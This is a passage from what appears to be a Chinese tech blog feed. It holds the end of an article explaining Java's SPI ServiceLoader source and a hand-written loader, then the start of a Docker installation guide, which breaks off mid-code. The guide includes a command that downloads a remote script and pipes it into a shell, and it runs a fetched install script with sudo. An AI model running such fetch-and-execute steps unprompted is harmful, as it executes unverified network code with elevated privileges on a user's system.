接口。之所以实现了迭代器，是为了方便后续我们能够通过迭代的方式得到对应的服务实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceLoader</span>&lt;<span class="title">S</span>&gt; <span class="keyword">implements</span> <span class="title">Iterable</span>&lt;<span class="title">S</span>&gt;</span>&#123; xxx...&#125;</span><br></pre></td></tr></table></figure><p>可以看到一个熟悉的常量定义：<code>private static final String PREFIX = &quot;META-INF/services/&quot;;</code>下面是 <code>load</code> 方法：可以发现 <code>load</code> 方法支持两种重载后的入参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">    ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">return</span> ServiceLoader.load(service, cl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">ServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        ClassLoader loader)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ServiceLoader&lt;&gt;(service, loader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">ServiceLoader</span><span class="params">(Class&lt;S&gt; svc, ClassLoader cl)</span> </span>&#123;</span><br><span class="line">    service = Objects.requireNonNull(svc, <span class="string">"Service interface cannot be null"</span>);</span><br><span class="line">    loader = (cl == <span class="keyword">null</span>) ? ClassLoader.getSystemClassLoader() : cl;</span><br><span class="line">    acc = (System.getSecurityManager() != <span class="keyword">null</span>) ? AccessController.getContext() : <span class="keyword">null</span>;</span><br><span class="line">    reload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    providers.clear();</span><br><span class="line">    lookupIterator = <span class="keyword">new</span> LazyIterator(service, loader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码的调用顺序，在 <code>reload()</code> 方法中是通过一个内部类 <code>LazyIterator</code> 实现的。<code>ServiceLoader</code> 实现了 <code>Iterable</code> 接口的方法后，具有了迭代的能力，在这个 <code>iterator</code> 方法被调用时，首先会在 <code>ServiceLoader</code> 的 <code>Provider</code> 缓存中进行查找，如果缓存中没有命中那么则在 <code>LazyIterator</code> 中进行查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;S&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Iterator&lt;S&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        Iterator&lt;Map.Entry&lt;String, S&gt;&gt; knownProviders</span><br><span class="line">                = providers.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (knownProviders.hasNext())</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> lookupIterator.hasNext(); <span class="comment">// 调用 LazyIterator</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> S <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (knownProviders.hasNext())</span><br><span class="line">                <span class="keyword">return</span> knownProviders.next().getValue();</span><br><span class="line">            <span class="keyword">return</span> lookupIterator.next(); <span class="comment">// 调用 LazyIterator</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>providers</code>就是一个缓存，在迭代器中如果先从这里面进行查找，如果里面有就继续往下找，没有了的话就用这个懒加载的<code>lookupIterator</code>查找。在调用 <code>LazyIterator</code> 时，看看它里面的<code>hasNext()</code>和<code>next()</code>两个方法是怎么实现的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (acc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hasNextService();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PrivilegedAction&lt;Boolean&gt; action = <span class="keyword">new</span> PrivilegedAction&lt;Boolean&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Boolean <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> hasNextService();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(action, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">hasNextService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (configs == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过PREFIX（META-INF/services/）和类名 获取对应的配置文件，得到具体的实现类</span></span><br><span class="line">            String fullName = PREFIX + service.getName();</span><br><span class="line">            <span class="keyword">if</span> (loader == <span class="keyword">null</span>)</span><br><span class="line">                configs = ClassLoader.getSystemResources(fullName);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                configs = loader.getResources(fullName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException x) &#123;</span><br><span class="line">            fail(service, <span class="string">"Error locating configuration files"</span>, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pending == <span class="keyword">null</span>) || !pending.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!configs.hasMoreElements()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pending = parse(service, configs.nextElement());</span><br><span class="line">    &#125;</span><br><span class="line">    nextName = pending.next();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> S <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (acc == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nextService();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PrivilegedAction&lt;S&gt; action = <span class="keyword">new</span> PrivilegedAction&lt;S&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> S <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> nextService();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(action, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> S <span class="title">nextService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!hasNextService())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">    String cn = nextName;</span><br><span class="line">    nextName = <span class="keyword">null</span>;</span><br><span class="line">    Class&lt;?&gt; c = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        c = Class.forName(cn, <span class="keyword">false</span>, loader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException x) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">"Provider "</span> + cn + <span class="string">" not found"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!service.isAssignableFrom(c)) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">"Provider "</span> + cn + <span class="string">" not a subtype"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        S p = service.cast(c.newInstance());</span><br><span class="line">        providers.put(cn, p);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">        fail(service,</span><br><span class="line">                <span class="string">"Provider "</span> + cn + <span class="string">" could not be instantiated"</span>,</span><br><span class="line">                x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Error();          <span class="comment">// This cannot happen</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>acc</code>是一个安全管理器，在前面通过<code>System.getSecurityManager()</code>判断并赋值，debug 看一下这里都是<code>null</code>，所以直接看<code>hasNextService()</code>和<code>nextService()</code>方法就可以了。</p><p>在<code>hasNextService()</code>方法中，会取出接口取出实现类的类名放到<code>nextName</code>中：</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426809.png" alt></p><p>接下来，在<code>nextService()</code>方法中，则会先加载这个实现类，然后实例化对象，最终放入缓存中去。</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426810.png" alt></p><p>在迭代器的迭代过程中，会完成所有实现类的实例化，其实归根结底，还是基于 java 反射去实现的。</p><h2 id="2、自己实现一个-ServiceLoader">2、自己实现一个 ServiceLoader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyServiceLoader</span>&lt;<span class="title">S</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应的接口 Class 模板</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;S&gt; service;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应实现类的 可以有多个，用 List 进行封装</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;S&gt; providers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类加载器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 暴露给外部使用的方法，通过调用这个方法可以开始加载自己定制的实现流程。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;S&gt; <span class="function">MyServiceLoader&lt;S&gt; <span class="title">load</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyServiceLoader&lt;&gt;(service);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法私有化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">MyServiceLoader</span><span class="params">(Class&lt;S&gt; service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">        <span class="keyword">this</span>.classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        doLoad();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键方法，加载具体实现类的逻辑</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 读取所有 jar 包里面 META-INF/services 包下面的文件，这个文件名就是接口名，然后文件里面的内容就是具体的实现类的路径加全类名</span></span><br><span class="line">            Enumeration&lt;URL&gt; urls = classLoader.getResources(<span class="string">"META-INF/services/"</span> + service.getName());</span><br><span class="line">            <span class="comment">// 挨个遍历取到的文件</span></span><br><span class="line">            <span class="keyword">while</span> (urls.hasMoreElements()) &#123;</span><br><span class="line">                <span class="comment">// 取出当前的文件</span></span><br><span class="line">                URL url = urls.nextElement();</span><br><span class="line">                System.out.println(<span class="string">"File = "</span> + url.getPath());</span><br><span class="line">                <span class="comment">// 建立链接</span></span><br><span class="line">                URLConnection urlConnection = url.openConnection();</span><br><span class="line">                urlConnection.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">                <span class="comment">// 获取文件输入流</span></span><br><span class="line">                InputStream inputStream = urlConnection.getInputStream();</span><br><span class="line">                <span class="comment">// 从文件输入流获取缓存</span></span><br><span class="line">                BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">                <span class="comment">// 从文件内容里面得到实现类的全类名</span></span><br><span class="line">                String className = bufferedReader.readLine();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (className != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 通过反射拿到实现类的实例</span></span><br><span class="line">                    Class&lt;?&gt; clazz = Class.forName(className, <span class="keyword">false</span>, classLoader);</span><br><span class="line">                    <span class="comment">// 如果声明的接口跟这个具体的实现类是属于同一类型，（可以理解为Java的一种多态，接口跟实现类、父类和子类等等这种关系。）则构造实例</span></span><br><span class="line">                    <span class="keyword">if</span> (service.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        Constructor&lt;? extends S&gt; constructor = (Constructor&lt;? extends S&gt;) clazz.getConstructor();</span><br><span class="line">                        S instance = constructor.newInstance();</span><br><span class="line">                        <span class="comment">// 把当前构造的实例对象添加到 Provider的列表里面</span></span><br><span class="line">                        providers.add(instance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 继续读取下一行的实现类，可以有多个实现类，只需要换行就可以了。</span></span><br><span class="line">                    className = bufferedReader.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"读取文件异常。。。"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回spi接口对应的具体实现类列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;S&gt; <span class="title">getProviders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> providers;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的流程就是：</p><ul><li>通过 URL 工具类从 jar 包的 <code>/META-INF/services</code> 目录下面找到对应的文件</li><li>读取这个文件的名称找到对应的 spi 接口</li><li>通过 <code>InputStream</code> 流将文件里面的具体实现类的全类名读取出来</li><li>根据获取到的全类名，先判断跟 spi 接口是否为同一类型，如果是的，那么就通过反射的机制构造对应的实例对象</li><li>将构造出来的实例对象添加到 <code>Providers</code> 的列表中</li></ul><h1>四、总结</h1><p>其实不难发现，SPI 机制的具体实现本质上还是通过反射完成的。即：<strong>我们按照规定将要暴露对外使用的具体实现类在 <strong><strong><code>META-INF/services/</code></strong></strong> 文件下声明。</strong></p><p>另外，SPI 机制在很多框架中都有应用：Spring 框架的基本原理也是类似的方式。还有 Dubbo 框架提供同样的 SPI 扩展机制，只不过 Dubbo 和 spring 框架中的 SPI 机制具体实现方式跟咱们今天学得这个有些细微的区别，不过整体的原理都是一致的</p><p>通过 SPI 机制能够大大地提高接口设计的灵活性，但是 SPI 机制也存在一些缺点，比如：</p><ul><li>遍历加载所有的实现类，这样效率还是相对较低的；</li><li>当多个 <code>ServiceLoader</code> 同时 <code>load</code> 时，会有并发问题。</li></ul><hr><p>参考文章</p><p><a href="https://mp.weixin.qq.com/s/eaRHMXCu7ku-SrOLMOdfeg" target="_blank" rel="noopener" title="https://mp.weixin.qq.com/s/eaRHMXCu7ku-SrOLMOdfeg">https://mp.weixin.qq.com/s/eaRHMXCu7ku-SrOLMOdfeg</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Java之SPI机制详解&lt;/h1&gt;
&lt;h1&gt;一、SPI概述&lt;/h1&gt;
&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;p&gt;SPI 即 &lt;code&gt;Service Provider Interface&lt;/code&gt; ，字面意思就是：“服务提供者的接口”，专门提供给服务提供者或者扩展框架功能的开发者去使用的一个接口。SPI 将服务接口和具体的服务实现分离开来，将服务调用方和服务实现者解耦，能够提升程序的扩展性、可维护性。修改或者替换服务实现并不需要修改调用方。例如SpringBoot 的自动装配就是基于spring 的 SPI 扩展机制和EnableAutoConfiguration实现的&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://blog.shawncoding.top/categories/Java/"/>
    
    
    <category term="Java基础" scheme="https://blog.shawncoding.top/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Docker常用应用部署</title>
    <link href="https://blog.shawncoding.top/posts/545cd0ce.html"/>
    <id>https://blog.shawncoding.top/posts/545cd0ce.html</id>
    <published>2023-12-13T08:38:01.000Z</published>
    <updated>2024-01-24T12:09:58.527Z</updated>
    
    <content type="html"><![CDATA[<h1>Docker常用应用部署</h1><h1>一、Ubuntu系统Docker快速安装</h1><blockquote><p>Docker官网安装文档：<a href="https://docs.docker.com/engine/install/ubuntu/" target="_blank" rel="noopener" title="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p></blockquote><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文本处理的流编辑器 -i直接修改读取的文件内容，而不是输出到终端</span></span><br><span class="line"><span class="comment"># sed -i 's/原字符串/新字符串/' /home/1.txt</span></span><br><span class="line"><span class="comment"># 下面这个是修改ubuntu的源</span></span><br><span class="line">sudo sed -i <span class="string">'s/cn.archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list</span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">sudo apt update -y</span><br><span class="line">sudo apt install curl</span><br><span class="line"><span class="comment"># 抓取docker安装脚本到一个文件中</span></span><br><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line"><span class="comment"># 执行脚本，通过脚本下载 推荐设置阿里云镜像下载加速 默认管理员登陆不加sudo；有警告就忽略</span></span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br><span class="line"></span><br><span class="line"><span class="comment">#==========解决每次输入sudo问题===========</span></span><br><span class="line"><span class="comment"># 将当前用户加入到docker组，这样每次使用就不需要sudo了</span></span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line"><span class="comment"># 更新用户组,这样才能生效</span></span><br><span class="line">newgrp - docker</span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#============加速器================</span></span><br><span class="line"><span class="comment"># 加速器网址：https://www.daocloud.io/mirror#accelerator-doc，可能有时会失效</span></span><br><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line"><span class="comment"># 查看配置文件，自己添加加速器</span></span><br><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># &#123;"registry-mirrors": ["http://hub-mirror.c.163.com"]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面地址任选一种就好</span></span><br><span class="line"><span class="comment">#腾讯云的镜像地址</span></span><br><span class="line">https://mirror.ccs.tencentyun.com</span><br><span class="line"><span class="comment">#网易的镜像地址</span></span><br><span class="line">http://hub-mirror.c.163.com</span><br><span class="line"><span class="comment">#下面的地址是假的，需要自己去阿里云 的容器镜像服务-》镜像加速器去复制自己的镜像地址</span></span><br><span class="line">https://xxxx.mirror.aliyuncs.com</span><br><span class="line"><span class="comment">#daocloud发布的镜像地址</span></span><br><span class="line">http://f1361db2.m.daocloud.io</span><br><span class="line"><span class="comment"># 最后要重启</span></span><br><span class="line">sudo systemctl restart docker.service</span><br><span class="line"><span class="comment"># 安装ssh</span></span><br><span class="line">sudo apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========docker-compose=============</span></span><br><span class="line"><span class="comment"># 在官网下载符合条件的：https://github.com/docker/compose/releases</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># wget也可以使用来下载</span></span><br><span class="line">mv /usr/<span class="built_in">local</span>/bin/docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 记得添加权限</span></span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放在bin目录下，在其他位置可以直接使用</span></span><br><span class="line">sudo mv /usr/<span class="built_in">local</span>/bin/docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 第二种方法</span></span><br><span class="line">sudo install docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">docker-compose ps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"><span class="comment"># 2023/6/20可用源</span></span><br><span class="line"><span class="comment"># 编辑 Docker 配置文件</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">        <span class="string">"https://dockerproxy.com"</span>,</span><br><span class="line">        <span class="string">"https://hub-mirror.c.163.com"</span>,</span><br><span class="line">        <span class="string">"https://mirror.baidubce.com"</span>,</span><br><span class="line">        <span class="string">"https://ccr.ccs.tencentyun.com"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 方法一，采用 systemctl 来重启，推荐</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"><span class="comment"># 方法二，采用 service 来重启</span></span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 